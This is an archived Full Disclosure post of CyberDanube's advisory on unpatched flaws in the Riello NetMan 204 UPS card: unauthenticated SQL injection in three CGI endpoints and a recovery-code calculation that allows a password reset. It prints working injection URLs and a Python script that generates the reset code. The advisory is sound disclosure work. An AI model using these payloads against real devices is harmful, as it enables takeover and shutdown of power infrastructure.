---
title: CyberDanube Security Research 20240919-0 | Multiple Vulnerabilities in Netman204
url: https://seclists.org/fulldisclosure/2024/Sep/50
source: Full Disclosure
date: 2024-09-25
fetch_date: 2025-10-06T18:31:16.021143
---

# CyberDanube Security Research 20240919-0 | Multiple Vulnerabilities in Netman204

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](49)
[By Date](date.html#50)
[![Next](/images/right-icon-16x16.png)](51)

[![Previous](/images/left-icon-16x16.png)](49)
[By Thread](index.html#50)
[![Next](/images/right-icon-16x16.png)](51)

![](/shared/images/nst-icons.svg#search)

# CyberDanube Security Research 20240919-0 | Multiple Vulnerabilities in Netman204

---

*From*: Thomas Weber via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 23 Sep 2024 07:13:16 +0000

---

```
CyberDanube Security Research 20240919-0
-------------------------------------------------------------------------------
                title| Multiple Vulnerabilities
              product| Netman 204
   vulnerable version| 4.05
        fixed version| -
           CVE number| CVE-2024-8877, CVE-2024-8878
               impact| High
             homepage| https://www.riello-ups.com/
                found| 2024-05-17
                   by| D. Blagojevic (Office Vienna)
                     | S. Dietz (Office Vienna)
                     | T. Weber (Office Vienna)
                     | CyberDanube Security Research
                     | Vienna | St. Pölten
                     |
                     | https://www.cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Riello Elettronica, lead by Cav. Lav. Pierantonio Riello, has a presence today
in the Electrical manufacturing industry with two divisions: Energy, Automation
and Security. It is a leader in the Uninterruptible Power Supply market with
the well-known brand Riello UPS.
Energy represents the Group’s core business, in particular with the manufacture
of UPS that are firstly able to guarantee the quality of electricity and
secondly maintain normal operation and continuity in case of blackouts or
anomalies in the energy supply.
Riello UPS designs and produces strategical solutions for every kind of
requirement and make a bespoke offering according to the clients’ needs: from
banks to the hospitals, transport to infrastructures, from domestic use to data
centres."

Source: https://www.riello-ups.com/pages/41-the-riello-elettronica-group

Vulnerable versions
-------------------------------------------------------------------------------
NetMan 204 / 4.05

Vulnerability overview
-------------------------------------------------------------------------------
1) SQL Injection (CVE-2024-8877)
The three endpoints /cgi-bin/db_datalog_w.cgi, /cgi-bin/db_eventlog_w.cgi, and
/cgi-bin/db_multimetr_w.cgi are vulnerable to SQL injection without prior
authentication. This enables an attacker to modify the collected log data in an
arbitrary way.

2) Unauthenticated Password Reset (CVE-2024-8878)
By navigating to the endpoint /recoverpassword.html an attacker can gather the
netmanid from the UPS. This id can be used to calculate the recovery code for
resetting the password. This way enables an attacker to take over control of
the UPS and e.g. turn it off.

Proof of Concept
-------------------------------------------------------------------------------
1) SQL Injection (CVE-2024-8877)
The system is subsceptible to SQL injections, which is illustrated by the
following payloads:

AND 1=0:
/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
gravity=%25&type=%25%27and/**/%271%27=%270

AND 1=1:
/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
gravity=%25&type=%25%27and/**/%271%27=%271

The first request does not return any data, while the second request returns
all entries with a start and end date in the given interval.

2) Unauthenticated Password Reset (CVE-2024-8878)
The following python script can be used to generate the recovery code from the
netmanid:

import hashlib
import sys
def calc_code(netman_id):
    secret = b"NMP"
    netman_id = secret + netman_id[3:]
    round1 = hashlib.md5(netman_id).hexdigest().encode('utf-8')
    round2 = hashlib.sha1(round1).hexdigest()
    code = round2[5:5+7]
    return code
if len(sys.argv) < 2:
    sys.exit("usage: {} netman_id".format(sys.argv[0]))
netman_id = sys.argv[1]
print(calc_code(netman_id.encode('utf-8'))

Inputting the recovery code in /recoverpassword.html resets the login
credentials to admin:admin.

Solution
-------------------------------------------------------------------------------
None

Workaround
-------------------------------------------------------------------------------
Limit access to the device.

Recommendation
-------------------------------------------------------------------------------
Riello should release a firmware update that fixes the mentioned
vulnerabilities.
Customers should not use this device in productive networks.

Contact Timeline
-------------------------------------------------------------------------------
2024-05-21: Contacting Riello UPS Group via riello () riello-ups com.
2024-06-06: Contacting Riello UPS Group via security-incident () riello-ups com.
2024-06-10: Received confirmation that the issue is being looked into.
2024-07-22: Asking Riello UPS Group for a status of the update.
2024-07-22: Contact stated that there is no planned date for the
            update.
2024-08-05: Asking Riello UPS Group for a status of the update and telling them
            that the advisory will be published on 2024-09-19 after a 90-day
            period as stated in our Responsible Disclosure Agreement.
2024-08-07: Contact stated that there are no news regarding the update and that
            it would take longer than 2024-09-19.
2024-08-13: Asking Riello UPS Group about news on the update and a possible
            release date.
2024-08-26: Contact stated that there are is no information regarding the
            update.
2024-09-19: Advisory published.

Web: https://www.cyberdanube.com
Twitter: https://twitter.com/cyberdanube
Mail: research at cyberdanube dot com

EOF David Blagojevic / @2024
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](49)
[By Date](date.html#50)
[![Next](/images/right-icon-16x16.png)](51)

[![Previous](/images/left-icon-16x16.png)](49)
[By Thread](index.html#50)
[![Next](/images/right-icon-16x16.png)](51)

### Current thread:

* **CyberDanube Security Research 20240919-0 | Multiple Vulnerabilities in Netman204** *Thomas Weber via Fulldisclosure (Sep 23)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/v...